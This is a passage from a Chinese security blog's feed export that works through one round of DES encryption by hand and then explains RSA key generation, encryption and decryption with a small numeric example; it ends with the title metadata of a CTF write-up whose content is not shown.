class="number">11110001</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5a329385cb94465a98992859e6b42bdb.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/8258fa37be9148139c7b868e496b4f6b.png" alt="在这里插入图片描述"></p><p>压缩置换 1：</p><p>00010011 8<br>00110100 16<br>01010111 24<br>01111001 32<br>10011011 40<br>10111100 48<br>11011111 56<br>11110001 64</p><p><img src="https://img-blog.csdnimg.cn/141f6f7d9c6e4302ae8a4926d140bdb0.png" alt="在这里插入图片描述"><br>按照表格选出上述数字</p><p>1111000<br>0110011<br>0010101<br>0101111<br>0101010<br>1011001<br>1001111<br>0001111</p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K0=<span class="number">11110000110011001010101011110101010101100110011110001111</span></span><br></pre></td></tr></table></figure><p>拆分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C0=<span class="number">1111000011001100101010101111</span></span><br><span class="line">D0=<span class="number">0101010101100110011110001111</span></span><br></pre></td></tr></table></figure><p>第一轮，左移 1 位</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C1=<span class="number">1110000110011001010101011111</span></span><br><span class="line">D1=<span class="number">1010101011001100111100011110</span></span><br></pre></td></tr></table></figure><p>合并得到新的子秘钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1D1=<span class="number">11100001100110010101010111111010101011001100111100011110</span></span><br></pre></td></tr></table></figure><p>压缩置换 2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1110000</span>  <span class="number">7</span>    </span><br><span class="line"><span class="number">1100110</span>  <span class="number">14</span></span><br><span class="line"><span class="number">0101010</span>  <span class="number">21</span></span><br><span class="line"><span class="number">1011111</span>  <span class="number">28</span></span><br><span class="line"><span class="number">1010101</span>  <span class="number">35</span></span><br><span class="line"><span class="number">0110011</span>  <span class="number">42</span></span><br><span class="line"><span class="number">0011110</span>  <span class="number">49</span></span><br><span class="line"><span class="number">0011110</span>  <span class="number">56</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f5f925ba28e24e34ac90f51ef2a5ca86.png" alt="在这里插入图片描述"></p><p>根据压缩置换 2 表得到 K1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">000110</span></span><br><span class="line"><span class="number">110000</span></span><br><span class="line"><span class="number">001011</span></span><br><span class="line"><span class="number">101111</span></span><br><span class="line"><span class="number">111111</span></span><br><span class="line"><span class="number">000111</span></span><br><span class="line"><span class="number">000001</span></span><br><span class="line"><span class="number">110010</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">K1</span>(<span class="number">48</span>)= <span class="number">00011011</span> <span class="number">00000010</span> <span class="number">11101111</span> <span class="number">11111100</span> <span class="number">01110000</span> <span class="number">01110010</span></span><br></pre></td></tr></table></figure><h3 id="初始转换"><a class="markdownIt-Anchor" href="#初始转换">#</a> 初始转换</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M=<span class="number">00000001</span> <span class="number">00100011</span> <span class="number">01000101</span> <span class="number">01100111</span> <span class="number">10001001</span> <span class="number">10101011</span> <span class="number">11001101</span> <span class="number">11101111</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">00000001</span> </span><br><span class="line"><span class="number">00100011</span> </span><br><span class="line"><span class="number">01000101</span> </span><br><span class="line"><span class="number">01100111</span> </span><br><span class="line"><span class="number">10001001</span> </span><br><span class="line"><span class="number">10101011</span> </span><br><span class="line"><span class="number">11001101</span> </span><br><span class="line"><span class="number">11101111</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e3cf910b01294c3399b5b9a2618482a1.png" alt="在这里插入图片描述"><br>根据初始置换表转换：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000001</span> <span class="number">8</span></span><br><span class="line"><span class="number">00100011</span> <span class="number">16</span></span><br><span class="line"><span class="number">01000101</span> <span class="number">24</span></span><br><span class="line"><span class="number">01100111</span> <span class="number">32</span></span><br><span class="line"><span class="number">10001001</span> <span class="number">40</span></span><br><span class="line"><span class="number">10101011</span> <span class="number">48</span></span><br><span class="line"><span class="number">11001101</span> <span class="number">56</span></span><br><span class="line"><span class="number">11101111</span> <span class="number">64</span></span><br></pre></td></tr></table></figure><p>置换得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11001100</span></span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">11001100</span></span><br><span class="line"><span class="number">11111111</span></span><br><span class="line"><span class="number">11110000</span></span><br><span class="line"><span class="number">10101010</span></span><br><span class="line"><span class="number">11110000</span></span><br><span class="line"><span class="number">10101010</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M=<span class="number">11001100</span> <span class="number">00000000</span> <span class="number">11001100</span> <span class="number">11111111</span> <span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><p>分为左右两部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L0=<span class="number">11001100</span> <span class="number">00000000</span> <span class="number">11001100</span> <span class="number">11111111</span></span><br><span class="line">R0=<span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><h3 id="扩展置换"><a class="markdownIt-Anchor" href="#扩展置换">#</a> 扩展置换</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0=<span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><p>分组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1111</span> </span><br><span class="line">    <span class="number">0000</span> </span><br><span class="line">        <span class="number">1010</span> </span><br><span class="line">            <span class="number">1010</span> </span><br><span class="line">    <span class="number">1111</span> </span><br><span class="line">    <span class="number">0000</span> </span><br><span class="line">    <span class="number">1010</span> </span><br><span class="line">    <span class="number">1010</span></span><br></pre></td></tr></table></figure><p>拓展置换得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">011110 </span><br><span class="line">    <span class="number">100001</span> </span><br><span class="line">        <span class="number">0</span>10101 </span><br><span class="line">            <span class="number">0</span>10101 </span><br><span class="line">    011110 </span><br><span class="line">    <span class="number">100001</span> </span><br><span class="line">    <span class="number">0</span>10101 </span><br><span class="line">    <span class="number">0</span>10101</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E(R0)<span class="number">48</span>=01111010 <span class="number">000</span>10101 <span class="number">0</span>1010101 01111010 <span class="number">000</span>10101 <span class="number">0</span>1010101</span><br></pre></td></tr></table></figure><p>R048=E (R0) 异或 K1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K1(<span class="number">48</span>)= 00011011 <span class="number">000000</span>10 <span class="number">11101111</span> <span class="number">11111100</span> 01110000 01110010  </span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0(<span class="number">48</span>)=01100001 <span class="number">000</span>10111 <span class="number">10111010</span> <span class="number">10000110</span> 01100101 <span class="number">00</span>100111</span><br></pre></td></tr></table></figure><h3 id="s盒替换"><a class="markdownIt-Anchor" href="#s盒替换">#</a> S 盒替换</h3><p>将 R0 分组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">011000</span><br><span class="line"><span class="number">0</span>10001</span><br><span class="line">011110</span><br><span class="line"><span class="number">111010</span></span><br><span class="line"><span class="number">100001</span></span><br><span class="line"><span class="number">100110</span></span><br><span class="line"><span class="number">0</span>10100</span><br><span class="line"><span class="number">100111</span></span><br></pre></td></tr></table></figure><p>扩展位二进制转十进制，原位二进制转为十进制，对应表格中数字转为二进制</p><table><thead><tr><th>组</th><th>列</th><th>值</th></tr></thead><tbody><tr><td>S1: 00=0</td><td>1100=12</td><td>5=0101</td></tr><tr><td>S2:01=1</td><td>1000=8</td><td>12=1100</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/a018a0a03c624fcd864a96a3e1bbf815.png" alt="在这里插入图片描述"></p><table><thead><tr><th>组</th><th>列</th><th>值</th></tr></thead><tbody><tr><td>S3：00=0</td><td>1111=15</td><td>8=1000</td></tr><tr><td>S4：10=2</td><td>1101=13</td><td>2=0010</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/4e5d0dd0e418412cad3b1af3b89bff6c.png" alt="在这里插入图片描述"></p><table><thead><tr><th>组</th><th>列</th><th>值</th></tr></thead><tbody><tr><td>S5：11=3</td><td>0000=0</td><td>11=1011</td></tr><tr><td>S6：10=2</td><td>0011=3</td><td>5=0101</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/191b04bf663540808826c522bd0b79c2.png" alt="在这里插入图片描述"></p><table><thead><tr><th>组</th><th>列</th><th>值</th></tr></thead><tbody><tr><td>S7：00=0</td><td>1010=10</td><td>9=1001</td></tr><tr><td>S8：11=3</td><td>0011=3</td><td>7=0111</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/65568edcdd1543d68e395157b854a99b.png" alt="在这里插入图片描述"><br>最终</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S1(011000)=<span class="number">0</span>101, S2(<span class="number">0</span>10001)=<span class="number">1100</span>, S3(011110)=<span class="number">1000</span>, S4(<span class="number">111010</span>)=<span class="number">00</span>10 S5(<span class="number">100001</span>)=<span class="number">1011</span>, S6(<span class="number">100110</span>)=<span class="number">0</span>101, S7(<span class="number">0</span>10100)=<span class="number">1001</span>, S8(<span class="number">100111</span>)=0111</span><br></pre></td></tr></table></figure><h3 id="p盒置换"><a class="markdownIt-Anchor" href="#p盒置换">#</a> P 盒置换</h3><p>分组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>101  <span class="number">4</span></span><br><span class="line"><span class="number">1100</span>  <span class="number">8</span></span><br><span class="line"><span class="number">1000</span>  <span class="number">12</span></span><br><span class="line"><span class="number">00</span>10  <span class="number">16</span></span><br><span class="line"><span class="number">1011</span>  <span class="number">20</span></span><br><span class="line"><span class="number">0</span>101  <span class="number">24</span></span><br><span class="line"><span class="number">1001</span>  <span class="number">28</span></span><br><span class="line">0111  <span class="number">32</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8e0a181dd1f94cbf90170f1db29b1b95.png" alt="在这里插入图片描述"><br>根据 P 盒置换表转换得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>10</span><br><span class="line">0011</span><br><span class="line"><span class="number">0</span>100</span><br><span class="line"><span class="number">1010</span></span><br><span class="line"><span class="number">1010</span></span><br><span class="line"><span class="number">1001</span></span><br><span class="line"><span class="number">1011</span></span><br><span class="line"><span class="number">1011</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F= <span class="number">00</span>100011 <span class="number">0</span>1001010 <span class="number">10101001</span> <span class="number">10111011</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L0=<span class="number">11001100</span> <span class="number">00000000</span> <span class="number">11001100</span> <span class="number">11111111</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1=L0^F=<span class="number">11101111</span> <span class="number">0</span>1001010 01100101 <span class="number">0</span>1000100</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L1=R0=<span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><p>经过第一轮加密后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M1=<span class="number">11101111</span> <span class="number">01001010</span> <span class="number">01100101</span> <span class="number">01000100</span> <span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><p>即<br> M1=(EF4A6544F0AAF0AA) 16</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;des加密&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#des加密&quot;&gt;#&lt;/a&gt; DES 加密&lt;/h3&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    
    <category term="信息安全" scheme="https://ki10moc.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="密码学" scheme="https://ki10moc.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="DES" scheme="https://ki10moc.github.io/tags/DES/"/>
    
  </entry>
  
  <entry>
    <title>信安实验-RSA(备课)</title>
    <link href="https://ki10moc.github.io/2022/09/25/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-RSA(%E5%A4%87%E8%AF%BE)/"/>
    <id>https://ki10moc.github.io/2022/09/25/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-RSA(%E5%A4%87%E8%AF%BE)/</id>
    <published>2022-09-25T15:07:08.000Z</published>
    <updated>2022-09-26T06:29:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h2><ul><li><p>来源</p><p>RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德・李维斯特（Ron Rivest）、阿迪・萨莫尔（Adi Shamir）和伦纳德・阿德曼（Leonard Adleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。</p></li><li><p>安全性</p><p>RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破。到 2017 年为止，还没有任何可靠的攻击 RSA 算法的方式。</p></li></ul><h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识">#</a> 前置知识</h2><h3 id="模运算"><a class="markdownIt-Anchor" href="#模运算">#</a> 模运算</h3><p>假设 a,r,m∈Z（Z 为整数集），并且 m&gt;0。如果 m 除 a-r，可记作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a ≡ r mod m</span><br></pre></td></tr></table></figure><p>其中 m 为模数，r 为余数</p><h3 id="余数计算"><a class="markdownIt-Anchor" href="#余数计算">#</a> 余数计算</h3><p>总可以找到一个 a∈Z，使得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = q · m + r , 其中<span class="number">0</span> ≤ r &lt; m</span><br></pre></td></tr></table></figure><p>由于 a - r = q・m（m 除 a-r），上面的表达式可以写作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a ≡ r mod <span class="title function_ invoke__">m</span>(r∈&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,…,m-<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如a=<span class="number">88</span>,m=<span class="number">12</span>,则</span><br><span class="line"></span><br><span class="line"><span class="number">88</span> = <span class="number">12</span> ·<span class="number">7</span> + <span class="number">4</span></span><br><span class="line">因此<span class="number">88</span> ≡ <span class="number">4</span> mod <span class="number">12</span></span><br></pre></td></tr></table></figure><h3 id="等价类中所有成员得到行为等价"><a class="markdownIt-Anchor" href="#等价类中所有成员得到行为等价">#</a> 等价类中所有成员得到行为等价</h3><p>对于一个给定模数 m，选择等价类中任何一个元素来计算，结果都是一样的</p><p>直接计算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>⁸ = <span class="number">6561</span> ≡ <span class="number">2</span> mod <span class="number">7</span></span><br></pre></td></tr></table></figure><p>替代计算 (简化)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将<span class="number">3</span>⁸ 替换为<span class="number">3</span>⁴ ·<span class="number">3</span>⁴ = <span class="number">81</span> ·<span class="number">81</span></span><br><span class="line">因为<span class="number">81</span> = <span class="number">11</span> · <span class="number">7</span> +<span class="number">4</span></span><br><span class="line">则<span class="number">3</span>⁸ = <span class="number">81</span> · <span class="number">81</span> ≡ <span class="number">4</span> · <span class="number">4</span> =<span class="number">16</span> mod <span class="number">7</span></span><br><span class="line">最后得到<span class="number">16</span> ≡ <span class="number">2</span> mod <span class="number">7</span></span><br></pre></td></tr></table></figure><h3 id="乘法逆元模逆元"><a class="markdownIt-Anchor" href="#乘法逆元模逆元">#</a> 乘法逆元 (模逆元)</h3><p>模逆元也称为模倒数。</p><p>一整数 𝑎 对同余 𝑛 之模逆元是指满足以下公式的整数 𝑏：</p><p><img src="https://img-blog.csdnimg.cn/12c59c3f2e6e421ab7f18a30d9f77fb2.png" alt="在这里插入图片描述"></p><p>也可以写成以下的式子：</p><p><img src="https://img-blog.csdnimg.cn/d7d8c79d32af4686a643fcf6615742a9.png" alt="在这里插入图片描述"></p><p>整数 𝑎 对模数 𝑛 之模逆元存在的充分必要条件是 𝑎 和 𝑛 互素，若此模逆元存在，在模数 𝑛 下的除法可以用和对应模逆元的乘法来达成，此概念和实数除法的概念相同。</p><p><img src="https://img-blog.csdnimg.cn/9a93305db52546e7b3d4a25be7976ba9.png" alt="在这里插入图片描述"></p><h3 id="python实现模逆元"><a class="markdownIt-Anchor" href="#python实现模逆元">#</a> Python 实现模逆元</h3><p>可以使用 Python 第三方包 Crypto 的 inverse () 函数求模逆元。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import inverse</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">inverse</span>(<span class="number">3</span>, <span class="number">7</span>))  <span class="comment"># 3 是要求逆元的数，7是模数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5</span></span><br></pre></td></tr></table></figure><p>可以使用 Python 第三方包 gmpy2 的 invert () 函数求模逆元。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 import invert</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">invert</span>(<span class="number">3</span>, <span class="number">7</span>)) <span class="comment"># 3 是要求逆元的数，7是模数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5</span></span><br></pre></td></tr></table></figure><p>可以在 SageMath 中直接用 inverse_mod () 函数求模逆元。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">inverse_mod</span>(<span class="number">3</span>, <span class="number">7</span>) <span class="comment"># 3 是要求逆元的数，7是模数</span></span><br></pre></td></tr></table></figure><h3 id="模运算-2"><a class="markdownIt-Anchor" href="#模运算-2">#</a> 模运算</h3><p>加法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> + <span class="number">4</span> ≡ <span class="number">0</span> (𝑚𝑜𝑑 <span class="number">7</span>)</span><br><span class="line"><span class="number">5</span> + <span class="number">5</span> ≡ <span class="number">3</span> (𝑚𝑜𝑑 <span class="number">7</span>)</span><br><span class="line"><span class="number">1</span> + <span class="number">5</span> ≡ <span class="number">6</span> (𝑚𝑜𝑑 <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>减法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> − <span class="number">2</span> ≡ <span class="number">3</span> (𝑚𝑜𝑑 <span class="number">7</span>)</span><br><span class="line"><span class="number">3</span> − <span class="number">5</span> ≡ <span class="number">3</span> − <span class="number">5</span> + <span class="number">7</span> ≡ <span class="number">3</span> + <span class="number">2</span> (𝑚𝑜𝑑 <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>乘法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> × <span class="number">4</span> ≡ <span class="number">5</span> (𝑚𝑜𝑑 <span class="number">7</span>)</span><br><span class="line"><span class="number">2</span> × <span class="number">2</span> ≡ <span class="number">4</span> (𝑚𝑜𝑑 <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>模运算没有除法 (此处结合乘法逆元)</p><p><img src="https://img-blog.csdnimg.cn/a0d893b0a52e4f7283bcc9d69a88ed24.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/93e08ed2edd046d5b9f6efc84efc7475.png" alt="在这里插入图片描述"></p><h3 id="欧拉函数"><a class="markdownIt-Anchor" href="#欧拉函数">#</a> 欧拉函数</h3><p>Zm 内与 m 互素的整数的个数可以表示为 φ(n)</p><p>示例：</p><p 0,="" 1,="" 2,="" 3,="" 4,="" 5="">假设 m 等于 6 时，现在对应的集合为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">0</span>, <span class="number">6</span>) = <span class="number">6</span></span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">1</span>, <span class="number">6</span>) = <span class="number">1</span>------互素</span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">2</span>, <span class="number">6</span>) = <span class="number">2</span></span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">3</span>, <span class="number">6</span>) = <span class="number">3</span></span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">4</span>, <span class="number">6</span>) = <span class="number">2</span></span><br><span class="line"><span class="title function_ invoke__">GCD</span>(<span class="number">5</span>, <span class="number">6</span>) = <span class="number">1</span>------互素</span><br></pre></td></tr></table></figure><p>由于该集合中，有两个与 6 互素的数字，即 1 和 5</p><p>所以欧拉函数的值为 2，即 φ(6) = 2。</p><p>φ(n)=(p-1)(q-1)     //pq 为不相等的质数</p><h2 id="秘钥生成"><a class="markdownIt-Anchor" href="#秘钥生成">#</a> 秘钥生成</h2><p>1、选择两个不相等的质数 p 和 q</p><p>2、计算 q 与 p 的乘积 n</p><p>3、计算 n 的欧拉函数 φ(n)</p><p>4、选择一个整数 e，(1&lt;e&lt;φ(n))，且 e 与 φ(n) 互质</p><p>5、计算 e 对于 φ(n) 的模反元素 d，公式表示为 <code>ed≡1(modφ(n))</code></p><p>6、(n,e) 打包为公钥，(n,d) 打包为秘钥</p><h2 id="加解密函数"><a class="markdownIt-Anchor" href="#加解密函数">#</a> 加解密函数</h2><p><img src="https://img-blog.csdnimg.cn/44d5e9a4a31a411da09bc758be3623a3.png" alt="在这里插入图片描述"></p><h2 id="加密过程"><a class="markdownIt-Anchor" href="#加密过程">#</a> 加密过程</h2><p>1、首先取一个明文 m，假设为 4</p><p>2、选择不相等的质数。假设 q=3，p=11</p><p>3、计算 n=pq=33</p><p>4、计算 φ(n)=(p-1)(q-1)=(3-1)(11-1)=20</p><p>5、选择一个整数 e，假设 e=3</p><p>6、计算 d ≡ e⁻¹ ≡ 7 mod 20, 即 d = 7</p><p><img src="https://img-blog.csdnimg.cn/fb3eb258a52448bca6c167bdcd31746c.png" alt="在这里插入图片描述"></p><p>7、计算 mᵉ ≡ c mod n，即 64 ≡ 31 mod 33，得到 c = 33</p><p>此时得到密文 c = 31，公钥对 (33,3)，私钥对 (33,7)</p><h2 id="解密过程"><a class="markdownIt-Anchor" href="#解密过程">#</a> 解密过程</h2><p>1、假设只知道 n=33，c=31，e=3</p><p>2、首先分解 n，n=11・3</p><p>3、计算欧拉函数 φ(n)=(11-1)・(3-1)=20</p><p>4、计算模反元素 d，根据 <code>ed≡1(modφ(n))</code>  ，d=(20+1)/3=7</p><p>5、解密 <code>cᵈ ≡ m mod n</code>  ，即 31⁷ ≡ m mod 33，计算得到 m = 4</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简介&quot;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;来源&lt;/p&gt;
&lt;p&gt;RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 19</summary>
      
    
    
    
    
    <category term="密码学" scheme="https://ki10moc.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="RSA" scheme="https://ki10moc.github.io/tags/RSA/"/>
    
    <category term="数论" scheme="https://ki10moc.github.io/tags/%E6%95%B0%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯 2021 final MultistaeAgency</title>
    <link href="https://ki10moc.github.io/2022/09/21/[%E6%B9%96%E6%B9%98%E6%9D%AF%202021%20final]MultistaeAgency/"/>
    <id>https://ki10moc.github.io/2022/09/21/[%E6%B9%96%E6%B9%98%E6%9D%AF%202021%20final]MultistaeAgency/</id>
    <published>2022-09-21T15:51:08.000Z</published>
    <updated>2022-09-21T16:29:22.000Z</updated>
    
